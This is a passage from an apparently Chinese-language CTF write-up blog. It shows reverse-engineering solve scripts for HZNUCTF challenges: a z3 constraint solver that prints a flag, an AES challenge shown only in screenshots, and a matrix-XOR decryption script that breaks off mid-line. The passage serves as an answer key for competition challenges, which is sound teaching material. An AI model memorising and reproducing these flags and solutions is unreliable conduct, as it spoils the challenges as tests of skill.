i11i1Iii1I1[<span class="number">7</span>] + <span class="number">146</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">50</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">27</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">45</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>]) + <span class="number">17</span> * i11i1Iii1I1[<span class="number">17</span>] == <span class="number">18257</span>,</span><br><span class="line">    ((((<span class="number">25</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">89</span> * i11i1Iii1I1[<span class="number">2</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">150</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">250</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">166</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">126</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">207</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] == <span class="number">12591</span>,</span><br><span class="line">    (((((<span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">160</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>]) + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">66</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">19</span> * i11i1Iii1I1[<span class="number">19</span>] == <span class="number">52041</span>,</span><br><span class="line">    ((((((<span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">60</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">39</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">20</span>] == <span class="number">20253</span>,</span><br><span class="line">    (((((((<span class="number">45</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">650</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">900</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">651</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>]) + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] == <span class="number">18768</span>,</span><br><span class="line">    (((((<span class="number">555</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">6666</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">70</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">510</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">499</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">610</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">221</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">23</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">102</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2050</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">665</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">22</span>] == <span class="number">111844</span>,</span><br><span class="line">    (((((((<span class="number">1</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4444</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">5555</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">676</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">107</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>]) + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] == <span class="number">159029</span>,</span><br><span class="line">    (((<span class="number">520</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">222</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56655</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">1007</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">7777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">99999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] == <span class="number">2762025</span>,</span><br><span class="line">    ((((<span class="number">1323</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">9999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] == <span class="number">1551621</span>,</span><br><span class="line">    (((((<span class="number">777</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] == <span class="number">948348</span>,</span><br><span class="line">    ((((((<span class="number">97</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] == <span class="number">777044</span>,</span><br><span class="line">    (((((<span class="number">177</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">699</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">64</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">28</span> * i11i1Iii1I1[<span class="number">28</span>] == <span class="number">185016</span>,</span><br><span class="line">    ((((((<span class="number">77</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">26</span> * i11i1Iii1I1[<span class="number">25</span>] - -<span class="number">58</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">28</span>]) + <span class="number">29</span> * i11i1Iii1I1[<span class="number">29</span>] == <span class="number">130106</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ii1iIi1i11i:</span><br><span class="line">    s.add(i)</span><br><span class="line"></span><br><span class="line">res =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        res += <span class="built_in">chr</span>(s.model()[i11i1Iii1I1[i]].as_long())</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">tab = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[i+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">    tab[res[i+<span class="number">1</span>]] = res[i]</span><br><span class="line"><span class="built_in">print</span>(tab)</span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;111111116257645365477364777645752361&quot;</span></span><br><span class="line">flag = <span class="string">&quot;HZNUCTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">    flag += tab[i]</span><br><span class="line">flag+=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HZNUCTF&#123;ad7fa-76a7-ff6a-fffa-7f7d6a&#125;</span><br></pre></td></tr></table></figure>
<h3 id="水果忍者">水果忍者</h3>
<p>AES加密</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/02511bbf-892c-45d6-b19b-47ed2f1f2c55.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/7df6282c-0e31-4160-b0fa-ba697f1a6481.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/b91f85ed-1183-455c-9e1a-6d0c51834d1f.png"
                        alt=""
                 ></p>
<h3 id="randomsystem"><strong>randomsystem</strong></h3>
<p>大概逻辑就是矩阵操作，动调拿到密钥和盒解密一下。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">xor=[[<span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>]]</span><br><span class="line">pw=[[<span class="number">0x00000178</span>, <span class="number">0x00000164</span>, <span class="number">0x000000A9</span>, <span class="number">0x000001F5</span>, <span class="number">0x00000115</span>, <span class="number">0x00000149</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000156</span>], </span><br><span class="line">    [<span class="number">0x0000017C</span>, <span class="number">0x0000016D</span>, <span class="number">0x000000A2</span>, <span class="number">0x00000102</span>, <span class="number">0x0000017D</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015B</span>, <span class="number">0x00000133</span>], </span><br><span class="line">    [<span class="number">0x00000107</span>, <span class="number">0x00000167</span>, <span class="number">0x000000A2</span>, <span class="number">0x000001E4</span>, <span class="number">0x00000136</span>, <span class="number">0x0000014D</span>, <span class="number">0x0000015A</span>, <span class="number">0x00000153</span>], </span><br><span class="line">    [<span class="number">0x00000096</span>, <span class="number">0x000000C2</span>, <span class="number">0x000000AF</span>, <span class="number">0x00000158</span>, <span class="number">0x0000009E</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000080</span>, <span class="number">0x000000AF</span>], </span><br><span class="line">    [<span class="number">0x0000009E</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000098</span>, <span class="number">0x0000017B</span>, <span class="number">0x0000009E</span>, <span class="number">0x00000124</span>, <span class="number">0x00000082</span>, <span class="number">0x0000016D</span>], </span><br><span class="line">    [<span class="number">0x000000C5</span>, <span class="number">0x00000014</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000A1</span>, <span class="number">0x000000C6</span>, <span class="number">0x0000000A</span>, <span class="number">0x000000CF</span>, <span class="number">0x000000F4</span>], </span><br><span class="line">    [<span class="number">0x000000CA</span>, <span class="number">0x0000000E</span>, <span class="number">0x000000CC</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000FF</span>, <span class="number">0x00000023</span>, <span class="number">0x00000007</span>], </span><br><span class="line">    [<span class="number">0x0000009E</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000091</span>, <span class="number">0x00000161</span>, <span class="number">0x00000099</span>, <span class="number">0x00000165</span>, <span class="number">0x000000F6</span>, <span class="number">0x00000097</span>]]</span><br><span class="line">key=<span class="string">&#x27;ReVeReSe&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span 